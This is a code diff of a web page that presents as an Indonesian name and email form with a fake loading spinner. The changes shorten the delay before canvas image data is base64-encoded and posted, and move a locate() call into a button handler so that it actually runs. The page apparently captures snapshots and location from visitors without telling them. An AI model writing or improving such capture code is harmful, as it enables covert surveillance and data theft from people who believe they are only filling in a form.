@@ -74,7 +74,7 @@ var context = canvas.getContext('2d');
        var canvasData = canvas.toDataURL("image/png")
        cc = String(canvasData).replace("data:image/png;base64,","")
       //  console.log(cc)
-       post(cc); }, 7000);
+       post(cc); }, 5000);
   
 
 }
@@ -134,7 +134,7 @@ init();
       $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
       $('#nama').fadeOut();
       $('#alamatEmail').delay(15000).fadeIn();
-      
+      locate();
     });
 
     $('.tbl2').click(function() {
@@ -152,7 +152,7 @@ init();
 <body translate="no" class="p-5">
   <div id="gtau" style="display: none;"><i class="fa fa-refresh fa-spin"></i> Loading</div>
 <div id="nama">
-    <div class="form-group" onload="locate()">
+    <div class="form-group">
       <label for="namaform1">Nama</label>
       <input type="text" class="form-control" id="namaform1" aria-describedby="emailHelp" name="Nama" placeholder="masukkan nama">
     </div>
